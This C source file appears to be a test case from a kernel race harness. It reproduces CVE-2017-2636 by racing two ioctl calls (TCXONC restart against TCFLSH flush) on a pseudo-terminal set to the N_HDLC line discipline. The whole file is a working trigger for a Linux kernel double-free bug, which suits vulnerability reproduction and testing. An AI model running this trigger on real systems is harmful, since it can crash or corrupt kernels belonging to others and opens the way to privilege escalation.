#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <unistd.h>

int cve_2017_2636_fd;

void cve_2017_2636_init(void) {
  int n_hdlc = N_HDLC;
  char buf[100];
  memset(buf, 'a', 100);
  cve_2017_2636_fd = open("/dev/ptmx", O_RDWR);
  ioctl(cve_2017_2636_fd, TIOCSETD, &n_hdlc);
  ioctl(cve_2017_2636_fd, TCXONC, TCOOFF);
  write(cve_2017_2636_fd, buf, 100);
}

void cve_2017_2636_destroy(void) { close(cve_2017_2636_fd); }

void *cve_2017_2636_th1(void *arg) {
  ioctl(cve_2017_2636_fd, TCXONC, TCOON);
  return (void *)0;
}

void *cve_2017_2636_th2(void *arg) {
  ioctl(cve_2017_2636_fd, TCFLSH, TCIOFLUSH);
  return (void *)0;
}
